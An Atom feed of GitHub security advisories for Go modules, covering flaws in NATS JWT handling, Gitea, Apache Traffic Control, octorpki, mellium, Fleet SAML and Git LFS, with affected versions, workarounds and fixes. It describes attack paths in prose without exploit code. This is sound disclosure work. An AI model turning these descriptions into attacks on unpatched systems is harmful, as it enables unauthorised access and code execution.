<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2022-02-15T01:18:22.935Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <entry>
        <title type="html"><![CDATA[[github.com/nats-io/jwt/v2] Import token permissions checking not enforced]]></title>
        <id>https://github.com/advisories/GHSA-62mh-w5cv-p88c</id>
        <link href="https://github.com/advisories/GHSA-62mh-w5cv-p88c"/>
        <updated>2022-02-15T00:42:57.000Z</updated>
        <content type="html"><![CDATA[<p>(This advisory is canonically <a href="https://advisories.nats.io/CVE/CVE-2021-3127.txt">https://advisories.nats.io/CVE/CVE-2021-3127.txt</a>)</p>
<h2 id="problem-description">Problem Description</h2>
<p>The NATS server provides for Subjects which are namespaced by Account; all Subjects are supposed to be private to an account, with an Export/Import system used to grant cross-account access to some Subjects.  Some Exports are public, such that anyone can import the
relevant subjects, and some Exports are private, such that the Import requires a token JWT to prove permission.</p>
<p>The JWT library's validation of the bindings in the Import Token incorrectly warned on mismatches, instead of outright rejecting the token.</p>
<p>As a result, any account can take an Import token used by any other account and re-use it for themselves because the binding to the
importing account is not rejected, and use it to import <em>any</em> Subject from the Exporting account, not just the Subject referenced in the Import Token.</p>
<p>The NATS account-server system treats account JWTs as semi-public information, such that an attacker can easily enumerate all account JWTs and retrieve all Import Tokens from those account JWTs.</p>
<p>The CVE identifier should cover the JWT library repair and the nats-server containing the fixed JWT library, and any other application depending upon the fixed JWT library.</p>
<h2 id="affected-versions">Affected versions</h2>
<h4 id="jwt-library">JWT library</h4>
<ul>
<li>all versions prior to 2.0.1</li>
<li>fixed after nats-io/jwt#149 landed (2021-03-14)</li>
</ul>
<h4 id="nats-server">NATS Server</h4>
<ul>
<li>Version 2 prior to 2.2.0<ul>
<li>2.0.0 through and including 2.1.9 are vulnerable</li>
</ul>
</li>
<li>fixed with nats-io/nats-server@423b79440c (2021-03-14)</li>
</ul>
<h2 id="impact">Impact</h2>
<p>In deployments with untrusted accounts able to update the Account Server with imports, a malicious account can access any Subject from an account which provides Exported Subjects.</p>
<p>Abuse of this facility requires the malicious actor to upload their tampered Account JWT to the Account Server, providing the service operator with a data-store which can be scanned for signs of abuse.</p>
<h2 id="workaround">Workaround</h2>
<p>Deny access to clients to update their account JWT in the account server.</p>
<h2 id="solution">Solution</h2>
<p>Upgrade the JWT dependency in any application using it.</p>
<p>Upgrade the NATS server if using NATS Accounts (with private Exports; Account owners can create those at any time though).</p>
<p>Audit all accounts JWTs to scan for exploit attempts; a Python script to audit the accounts can be found at <a href="https://gist.github.com/philpennock/09d49524ad98043ff11d8a40c2bb0d5a">https://gist.github.com/philpennock/09d49524ad98043ff11d8a40c2bb0d5a</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nats-io/jwt/security/advisories/GHSA-62mh-w5cv-p88c">https://github.com/nats-io/jwt/security/advisories/GHSA-62mh-w5cv-p88c</a></li>
<li><a href="https://github.com/advisories/GHSA-62mh-w5cv-p88c">https://github.com/advisories/GHSA-62mh-w5cv-p88c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-62mh-w5cv-p88c</uri>
        </author>
        <published>2022-02-15T00:42:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/nats-io/jwt] Import token permissions checking not enforced]]></title>
        <id>https://github.com/advisories/GHSA-62mh-w5cv-p88c</id>
        <link href="https://github.com/advisories/GHSA-62mh-w5cv-p88c"/>
        <updated>2022-02-15T00:42:57.000Z</updated>
        <content type="html"><![CDATA[<p>(This advisory is canonically <a href="https://advisories.nats.io/CVE/CVE-2021-3127.txt">https://advisories.nats.io/CVE/CVE-2021-3127.txt</a>)</p>
<h2 id="problem-description">Problem Description</h2>
<p>The NATS server provides for Subjects which are namespaced by Account; all Subjects are supposed to be private to an account, with an Export/Import system used to grant cross-account access to some Subjects.  Some Exports are public, such that anyone can import the
relevant subjects, and some Exports are private, such that the Import requires a token JWT to prove permission.</p>
<p>The JWT library's validation of the bindings in the Import Token incorrectly warned on mismatches, instead of outright rejecting the token.</p>
<p>As a result, any account can take an Import token used by any other account and re-use it for themselves because the binding to the
importing account is not rejected, and use it to import <em>any</em> Subject from the Exporting account, not just the Subject referenced in the Import Token.</p>
<p>The NATS account-server system treats account JWTs as semi-public information, such that an attacker can easily enumerate all account JWTs and retrieve all Import Tokens from those account JWTs.</p>
<p>The CVE identifier should cover the JWT library repair and the nats-server containing the fixed JWT library, and any other application depending upon the fixed JWT library.</p>
<h2 id="affected-versions">Affected versions</h2>
<h4 id="jwt-library">JWT library</h4>
<ul>
<li>all versions prior to 2.0.1</li>
<li>fixed after nats-io/jwt#149 landed (2021-03-14)</li>
</ul>
<h4 id="nats-server">NATS Server</h4>
<ul>
<li>Version 2 prior to 2.2.0<ul>
<li>2.0.0 through and including 2.1.9 are vulnerable</li>
</ul>
</li>
<li>fixed with nats-io/nats-server@423b79440c (2021-03-14)</li>
</ul>
<h2 id="impact">Impact</h2>
<p>In deployments with untrusted accounts able to update the Account Server with imports, a malicious account can access any Subject from an account which provides Exported Subjects.</p>
<p>Abuse of this facility requires the malicious actor to upload their tampered Account JWT to the Account Server, providing the service operator with a data-store which can be scanned for signs of abuse.</p>
<h2 id="workaround">Workaround</h2>
<p>Deny access to clients to update their account JWT in the account server.</p>
<h2 id="solution">Solution</h2>
<p>Upgrade the JWT dependency in any application using it.</p>
<p>Upgrade the NATS server if using NATS Accounts (with private Exports; Account owners can create those at any time though).</p>
<p>Audit all accounts JWTs to scan for exploit attempts; a Python script to audit the accounts can be found at <a href="https://gist.github.com/philpennock/09d49524ad98043ff11d8a40c2bb0d5a">https://gist.github.com/philpennock/09d49524ad98043ff11d8a40c2bb0d5a</a>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nats-io/jwt/security/advisories/GHSA-62mh-w5cv-p88c">https://github.com/nats-io/jwt/security/advisories/GHSA-62mh-w5cv-p88c</a></li>
<li><a href="https://github.com/advisories/GHSA-62mh-w5cv-p88c">https://github.com/advisories/GHSA-62mh-w5cv-p88c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-62mh-w5cv-p88c</uri>
        </author>
        <published>2022-02-15T00:42:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/go-gitea/gitea] Cross-site Scripting in Gitea]]></title>
        <id>https://github.com/advisories/GHSA-r3gq-wxqf-q4gh</id>
        <link href="https://github.com/advisories/GHSA-r3gq-wxqf-q4gh"/>
        <updated>2022-02-15T00:18:14.000Z</updated>
        <content type="html"><![CDATA[<p>Cross Site Scripting (XSS) vulnerability exists in Gitea before 1.5.1 via the repository settings inside the external wiki/issue tracker URL field.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45329">https://nvd.nist.gov/vuln/detail/CVE-2021-45329</a></li>
<li><a href="https://github.com/go-gitea/gitea/pull/4710">https://github.com/go-gitea/gitea/pull/4710</a></li>
<li><a href="https://blog.gitea.io/2018/09/gitea-1.5.1-is-released/">https://blog.gitea.io/2018/09/gitea-1.5.1-is-released/</a></li>
<li><a href="https://github.com/advisories/GHSA-r3gq-wxqf-q4gh">https://github.com/advisories/GHSA-r3gq-wxqf-q4gh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r3gq-wxqf-q4gh</uri>
        </author>
        <published>2022-02-10T00:00:32.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/go-gitea/gitea] Capture-replay in Gitea]]></title>
        <id>https://github.com/advisories/GHSA-jrpg-35hw-m4p9</id>
        <link href="https://github.com/advisories/GHSA-jrpg-35hw-m4p9"/>
        <updated>2022-02-15T00:17:58.000Z</updated>
        <content type="html"><![CDATA[<p>Gitea is a project to help users set up a self-hosted Git service. Gitea before 1.11.2 is affected by Trusting HTTP Permission Methods on the Server Side when referencing the vulnerable admin or user API. This could allow a remote malicious user to execute arbitrary code.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45327">https://nvd.nist.gov/vuln/detail/CVE-2021-45327</a></li>
<li><a href="https://github.com/go-gitea/gitea/pull/10462">https://github.com/go-gitea/gitea/pull/10462</a></li>
<li><a href="https://github.com/go-gitea/gitea/pull/10465">https://github.com/go-gitea/gitea/pull/10465</a></li>
<li><a href="https://github.com/go-gitea/gitea/pull/10582">https://github.com/go-gitea/gitea/pull/10582</a></li>
<li><a href="https://blog.gitea.io/2020/03/gitea-1.11.2-is-released/">https://blog.gitea.io/2020/03/gitea-1.11.2-is-released/</a></li>
<li><a href="https://github.com/advisories/GHSA-jrpg-35hw-m4p9">https://github.com/advisories/GHSA-jrpg-35hw-m4p9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jrpg-35hw-m4p9</uri>
        </author>
        <published>2022-02-09T00:00:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/go-gitea/gitea] Cross Site Request Forgery in Gitea]]></title>
        <id>https://github.com/advisories/GHSA-4wp3-8q92-mh8w</id>
        <link href="https://github.com/advisories/GHSA-4wp3-8q92-mh8w"/>
        <updated>2022-02-15T00:18:10.000Z</updated>
        <content type="html"><![CDATA[<p>Cross Site Request Forgery (CSRF) vulnerability exists in Gitea before 1.5.2 via API routes.This can be dangerous especially with state altering POST requests.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45326">https://nvd.nist.gov/vuln/detail/CVE-2021-45326</a></li>
<li><a href="https://github.com/go-gitea/gitea/issues/4838">https://github.com/go-gitea/gitea/issues/4838</a></li>
<li><a href="https://github.com/go-gitea/gitea/pull/4840">https://github.com/go-gitea/gitea/pull/4840</a></li>
<li><a href="https://blog.gitea.io/2018/10/gitea-1.5.2-is-released/">https://blog.gitea.io/2018/10/gitea-1.5.2-is-released/</a></li>
<li><a href="https://github.com/advisories/GHSA-4wp3-8q92-mh8w">https://github.com/advisories/GHSA-4wp3-8q92-mh8w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4wp3-8q92-mh8w</uri>
        </author>
        <published>2022-02-09T00:00:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/go-gitea/gitea] Open redirect in Gitea]]></title>
        <id>https://github.com/advisories/GHSA-36h2-95gj-w488</id>
        <link href="https://github.com/advisories/GHSA-36h2-95gj-w488"/>
        <updated>2022-02-15T00:18:11.000Z</updated>
        <content type="html"><![CDATA[<p>Gitea before 1.4.3 is affected by URL Redirection to Untrusted Site ('Open Redirect') via internal URLs.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45328">https://nvd.nist.gov/vuln/detail/CVE-2021-45328</a></li>
<li><a href="https://github.com/go-gitea/gitea/issues/4332">https://github.com/go-gitea/gitea/issues/4332</a></li>
<li><a href="https://blog.gitea.io/2018/06/release-of-1.4.3/">https://blog.gitea.io/2018/06/release-of-1.4.3/</a></li>
<li><a href="https://github.com/advisories/GHSA-36h2-95gj-w488">https://github.com/advisories/GHSA-36h2-95gj-w488</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-36h2-95gj-w488</uri>
        </author>
        <published>2022-02-09T00:00:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/apache/trafficcontrol] Server-Side Request Forgery in Apache Traffic Control]]></title>
        <id>https://github.com/advisories/GHSA-wp47-9r3h-xfgq</id>
        <link href="https://github.com/advisories/GHSA-wp47-9r3h-xfgq"/>
        <updated>2022-02-15T00:18:47.000Z</updated>
        <content type="html"><![CDATA[<p>In Apache Traffic Control Traffic Ops prior to 6.1.0 or 5.1.6, an unprivileged user who can reach Traffic Ops over HTTPS can send a specially-crafted POST request to /user/login/oauth to scan a port of a server that Traffic Ops can reach.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23206">https://nvd.nist.gov/vuln/detail/CVE-2022-23206</a></li>
<li><a href="https://lists.apache.org/thread/lsrd2mqj29vrvwsh8g0d560vvz8n126f">https://lists.apache.org/thread/lsrd2mqj29vrvwsh8g0d560vvz8n126f</a></li>
<li><a href="https://github.com/advisories/GHSA-wp47-9r3h-xfgq">https://github.com/advisories/GHSA-wp47-9r3h-xfgq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wp47-9r3h-xfgq</uri>
        </author>
        <published>2022-02-07T00:00:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/apache/trafficcontrol] Server-Side Request Forgery in Apache Traffic Control]]></title>
        <id>https://github.com/advisories/GHSA-wp47-9r3h-xfgq</id>
        <link href="https://github.com/advisories/GHSA-wp47-9r3h-xfgq"/>
        <updated>2022-02-15T00:18:47.000Z</updated>
        <content type="html"><![CDATA[<p>In Apache Traffic Control Traffic Ops prior to 6.1.0 or 5.1.6, an unprivileged user who can reach Traffic Ops over HTTPS can send a specially-crafted POST request to /user/login/oauth to scan a port of a server that Traffic Ops can reach.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-23206">https://nvd.nist.gov/vuln/detail/CVE-2022-23206</a></li>
<li><a href="https://lists.apache.org/thread/lsrd2mqj29vrvwsh8g0d560vvz8n126f">https://lists.apache.org/thread/lsrd2mqj29vrvwsh8g0d560vvz8n126f</a></li>
<li><a href="https://github.com/advisories/GHSA-wp47-9r3h-xfgq">https://github.com/advisories/GHSA-wp47-9r3h-xfgq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wp47-9r3h-xfgq</uri>
        </author>
        <published>2022-02-07T00:00:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cloudflare/cfrpki/cmd/octorpki] Path traversal in github.com/cloudflare/cfrpki/cmd/octorpki]]></title>
        <id>https://github.com/advisories/GHSA-8459-6rc9-8vf8</id>
        <link href="https://github.com/advisories/GHSA-8459-6rc9-8vf8"/>
        <updated>2022-02-15T00:14:52.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In the case that a malicious TAL file is parsed pointing to a repository that provides a malicious ROA file which octorpki downloads, it is possible to bypass the current directory traversal mitigation to allow writing outside of the current directory. </p>
<h3 id="patches">Patches</h3>
<p>No patch release has been made</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cloudflare/cfrpki/security/advisories/GHSA-8459-6rc9-8vf8">https://github.com/cloudflare/cfrpki/security/advisories/GHSA-8459-6rc9-8vf8</a></li>
<li><a href="https://github.com/advisories/GHSA-8459-6rc9-8vf8">https://github.com/advisories/GHSA-8459-6rc9-8vf8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8459-6rc9-8vf8</uri>
        </author>
        <published>2022-02-14T22:52:15.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[mellium.im/xmpp] TLS certificate validation error in Mellium]]></title>
        <id>https://github.com/advisories/GHSA-m658-p24x-p74r</id>
        <link href="https://github.com/advisories/GHSA-m658-p24x-p74r"/>
        <updated>2022-02-15T00:17:04.000Z</updated>
        <content type="html"><![CDATA[<p>In Mellium mellium.im/xmpp through 0.21.0, an attacker capable of spoofing DNS TXT records can redirect a WebSocket connection request to a server under their control without causing TLS certificate verification to fail. This occurs because the wrong host name is selected during this verification.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-24968">https://nvd.nist.gov/vuln/detail/CVE-2022-24968</a></li>
<li><a href="https://mellium.im/cve/cve-2022-24968/">https://mellium.im/cve/cve-2022-24968/</a></li>
<li><a href="https://mellium.im/xmpp/">https://mellium.im/xmpp/</a></li>
<li><a href="https://github.com/advisories/GHSA-m658-p24x-p74r">https://github.com/advisories/GHSA-m658-p24x-p74r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m658-p24x-p74r</uri>
        </author>
        <published>2022-02-12T00:00:36.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/go-gitea/gitea] Gitea displaying raw OpenID error in UI]]></title>
        <id>https://github.com/advisories/GHSA-8h8p-x289-vvqr</id>
        <link href="https://github.com/advisories/GHSA-8h8p-x289-vvqr"/>
        <updated>2022-02-15T00:18:07.000Z</updated>
        <content type="html"><![CDATA[<p>Gitea is a project to help users set up a self-hosted Git service. Server Side Request Forgery (SSRF) vulnerability exists in Gitea before 1.7.0 using the OpenID URL. Gitea can leak sensitive information about the local network through the error provided by the UI. </p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-45325">https://nvd.nist.gov/vuln/detail/CVE-2021-45325</a></li>
<li><a href="https://github.com/go-gitea/gitea/pull/5705">https://github.com/go-gitea/gitea/pull/5705</a></li>
<li><a href="https://blog.gitea.io/2019/01/gitea-1.7.0-is-released/">https://blog.gitea.io/2019/01/gitea-1.7.0-is-released/</a></li>
<li><a href="https://github.com/go-gitea/gitea/issues/4973">https://github.com/go-gitea/gitea/issues/4973</a></li>
<li><a href="https://github.com/go-gitea/gitea/pull/5712">https://github.com/go-gitea/gitea/pull/5712</a></li>
<li><a href="https://github.com/advisories/GHSA-8h8p-x289-vvqr">https://github.com/advisories/GHSA-8h8p-x289-vvqr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-8h8p-x289-vvqr</uri>
        </author>
        <published>2022-02-09T00:00:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/fleetdm/fleet/v4] SAML authentication vulnerability due to stdlib XML parsing]]></title>
        <id>https://github.com/advisories/GHSA-w3wf-cfx3-6gcx</id>
        <link href="https://github.com/advisories/GHSA-w3wf-cfx3-6gcx"/>
        <updated>2022-02-11T23:59:21.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Due to issues in Go's standard library XML parsing, a valid SAML response may be mutated by an attacker to modify the trusted document. This can result in allowing unverified logins from a SAML IdP.</p>
<p>Users that configure Fleet with SSO login may be vulnerable to this issue.</p>
<h3 id="patches">Patches</h3>
<p>This issue is patched in 3.5.1 using <a href="https://github.com/mattermost/xml-roundtrip-validator">https://github.com/mattermost/xml-roundtrip-validator</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If upgrade to 3.5.1 is not possible, users should disable SSO authentication in Fleet.</p>
<h3 id="references">References</h3>
<p>See <a href="https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities/">https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities/</a> for more information about the underlying vulnerabilities.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Email us at <a href="mailto:security@fleetdm.com">security@fleetdm.com</a></li>
<li>Join #fleet in <a href="https://join.slack.com/t/osquery/shared_invite/zt-h29zm0gk-s2DBtGUTW4CFel0f0IjTEw">osquery Slack</a><h3 id="references-1">References</h3>
</li>
</ul>
<ul>
<li><a href="https://github.com/fleetdm/fleet/security/advisories/GHSA-w3wf-cfx3-6gcx">https://github.com/fleetdm/fleet/security/advisories/GHSA-w3wf-cfx3-6gcx</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-26276">https://nvd.nist.gov/vuln/detail/CVE-2020-26276</a></li>
<li><a href="https://github.com/fleetdm/fleet/commit/57812a532e5f749c8e18c6f6a652eca65c083607">https://github.com/fleetdm/fleet/commit/57812a532e5f749c8e18c6f6a652eca65c083607</a></li>
<li><a href="https://github.com/fleetdm/fleet/blob/master/CHANGELOG.md#fleet-351-dec-14-2020">https://github.com/fleetdm/fleet/blob/master/CHANGELOG.md#fleet-351-dec-14-2020</a></li>
<li><a href="https://github.com/mattermost/xml-roundtrip-validator">https://github.com/mattermost/xml-roundtrip-validator</a></li>
<li><a href="https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities">https://mattermost.com/blog/coordinated-disclosure-go-xml-vulnerabilities</a></li>
<li><a href="https://github.com/advisories/GHSA-w3wf-cfx3-6gcx">https://github.com/advisories/GHSA-w3wf-cfx3-6gcx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w3wf-cfx3-6gcx</uri>
        </author>
        <published>2022-02-11T23:59:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/nats-io/nats-server/v2] Nil dereference in NATS JWT, DoS of nats-server]]></title>
        <id>https://github.com/advisories/GHSA-h2fg-54x9-5qhq</id>
        <link href="https://github.com/advisories/GHSA-h2fg-54x9-5qhq"/>
        <updated>2022-02-11T23:43:22.000Z</updated>
        <content type="html"><![CDATA[<h2 id="problem-description">Problem Description</h2>
<p>The NATS account system has an Operator trusted by the servers, which signs Accounts, and each Account can then create and sign Users within their account.  The Operator should be able to safely issue Accounts to other entities which it does not fully trust.</p>
<p>A malicious Account could create and sign a User JWT with a state not created by the normal tooling, such that decoding by the NATS JWT library (written in Go) would attempt a nil dereference, aborting execution.</p>
<p>The NATS Server is known to be impacted by this.</p>
<h2 id="affected-versions">Affected versions</h2>
<h4 id="jwt-library">JWT library</h4>
<ul>
<li>all versions prior to 1.1.0</li>
</ul>
<h4 id="nats-server">NATS Server</h4>
<ul>
<li>Version 2 prior to 2.1.9</li>
</ul>
<h2 id="impact">Impact</h2>
<h4 id="jwt-library-1">JWT library</h4>
<ul>
<li>Programs would nil dereference and panic, aborting execution by default.</li>
</ul>
<h4 id="nats-server-1">NATS server</h4>
<ul>
<li>Denial of Service caused by process termination</li>
</ul>
<h2 id="workaround">Workaround</h2>
<p>If your NATS servers do not trust any accounts which are managed by untrusted entities, then malformed User credentials are unlikely to be encountered.</p>
<h2 id="solution">Solution</h2>
<p>Upgrade the JWT dependency in any application using it.</p>
<p>Upgrade the NATS server if using NATS Accounts.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nats-io/jwt/security/advisories/GHSA-h2fg-54x9-5qhq">https://github.com/nats-io/jwt/security/advisories/GHSA-h2fg-54x9-5qhq</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-26521">https://nvd.nist.gov/vuln/detail/CVE-2020-26521</a></li>
<li><a href="https://github.com/nats-io/nats-server/commit/9ff8bcde2e46009e98bd9e88f598af355f62c168">https://github.com/nats-io/nats-server/commit/9ff8bcde2e46009e98bd9e88f598af355f62c168</a></li>
<li><a href="https://advisories.nats.io/CVE/CVE-2020-26521.txt">https://advisories.nats.io/CVE/CVE-2020-26521.txt</a></li>
<li><a href="https://github.com/nats-io/nats-server/commits/master">https://github.com/nats-io/nats-server/commits/master</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VT67XCLIIBYRT762SVFBYFFTQFVSM3SI/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VT67XCLIIBYRT762SVFBYFFTQFVSM3SI/</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2020/11/02/2">http://www.openwall.com/lists/oss-security/2020/11/02/2</a></li>
<li><a href="https://github.com/advisories/GHSA-h2fg-54x9-5qhq">https://github.com/advisories/GHSA-h2fg-54x9-5qhq</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h2fg-54x9-5qhq</uri>
        </author>
        <published>2022-02-11T23:43:13.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/nats-io/nats-server/v2] Incorrect handling of credential expiry by NATS Server]]></title>
        <id>https://github.com/advisories/GHSA-4w5x-x539-ppf5</id>
        <link href="https://github.com/advisories/GHSA-4w5x-x539-ppf5"/>
        <updated>2022-02-11T23:42:49.000Z</updated>
        <content type="html"><![CDATA[<h2 id="problem-description">Problem Description</h2>
<p>NATS nats-server through 2020-10-07 has Incorrect Access Control because of how expired credentials are handled.</p>
<p>The NATS accounts system has expiration timestamps on credentials; the <a href="https://github.com/nats-io/jwt">https://github.com/nats-io/jwt</a> library had an API which encouraged misuse and an <code>IsRevoked()</code> method which misused its own API.</p>
<p>A new <code>IsClaimRevoked()</code> method has correct handling and the nats-server has been updated to use this.  The old <code>IsRevoked()</code> method now always returns true and other client code will have to be updated to avoid calling it.</p>
<p>The CVE identifier should cover any application using the old JWT API, where the nats-server is one of those applications.</p>
<h2 id="affected-versions">Affected versions</h2>
<h4 id="jwt-library">JWT library</h4>
<ul>
<li>all versions prior to 1.1.0</li>
<li>fixed after nats-io/jwt PR 103 landed (2020-10-06)</li>
</ul>
<h4 id="nats-server">NATS Server</h4>
<ul>
<li>Version 2 prior to 2.1.9<ul>
<li>2.0.0 through and including 2.1.8 are vulnerable.</li>
</ul>
</li>
<li>fixed with nats-io/nats-server PRs 1632, 1635, 1645</li>
</ul>
<h2 id="impact">Impact</h2>
<p>Time-based credential expiry did not work.</p>
<h2 id="workaround">Workaround</h2>
<p>Have credentials which only expire after fixes can be deployed.</p>
<h2 id="solution">Solution</h2>
<p>Upgrade the JWT dependency in any application using it.</p>
<p>Upgrade the NATS server if using NATS Accounts.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nats-io/jwt/security/advisories/GHSA-4w5x-x539-ppf5">https://github.com/nats-io/jwt/security/advisories/GHSA-4w5x-x539-ppf5</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-26892">https://nvd.nist.gov/vuln/detail/CVE-2020-26892</a></li>
<li><a href="https://github.com/nats-io/nats-server/commit/1e08b67f08e18cd844dce833a265aaa72500a12f">https://github.com/nats-io/nats-server/commit/1e08b67f08e18cd844dce833a265aaa72500a12f</a></li>
<li><a href="https://advisories.nats.io/CVE/CVE-2020-26892.txt">https://advisories.nats.io/CVE/CVE-2020-26892.txt</a></li>
<li><a href="https://github.com/nats-io/nats-server/commits/master">https://github.com/nats-io/nats-server/commits/master</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VT67XCLIIBYRT762SVFBYFFTQFVSM3SI/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/VT67XCLIIBYRT762SVFBYFFTQFVSM3SI/</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2020/11/02/2">https://www.openwall.com/lists/oss-security/2020/11/02/2</a></li>
<li><a href="https://github.com/advisories/GHSA-4w5x-x539-ppf5">https://github.com/advisories/GHSA-4w5x-x539-ppf5</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4w5x-x539-ppf5</uri>
        </author>
        <published>2022-02-11T23:42:20.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/git-lfs/git-lfs] Git LFS can execute a Git binary from the current directory]]></title>
        <id>https://github.com/advisories/GHSA-4g4p-42wc-9f3m</id>
        <link href="https://github.com/advisories/GHSA-4g4p-42wc-9f3m"/>
        <updated>2022-02-11T23:39:28.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>On Windows, if Git LFS operates on a malicious repository with a <code>git.bat</code> or <code>git.exe</code> file in the current directory, that program would be executed, permitting the attacker to execute arbitrary code.  This does not affect Unix systems.</p>
<p>This occurs because on Windows, Go includes (and prefers) the current directory when the name of a command run does not contain a directory separator.</p>
<h3 id="patches">Patches</h3>
<p>This version should be patched in v2.12.1, which will be released in coordination with this security advisory.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Other than avoiding untrusted repositories, there is no workaround.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Start a discussion in <a href="https://github.com/git-lfs/git-lfs/discussions">the Git LFS discussion page</a>.</li>
<li>If you cannot open a discussion, please email the core team using their usernames at <code>github.com</code>.<h3 id="references">References</h3>
</li>
</ul>
<ul>
<li><a href="https://github.com/git-lfs/git-lfs/security/advisories/GHSA-4g4p-42wc-9f3m">https://github.com/git-lfs/git-lfs/security/advisories/GHSA-4g4p-42wc-9f3m</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-27955">https://nvd.nist.gov/vuln/detail/CVE-2020-27955</a></li>
<li><a href="https://github.com/git-lfs/git-lfs/releases">https://github.com/git-lfs/git-lfs/releases</a></li>
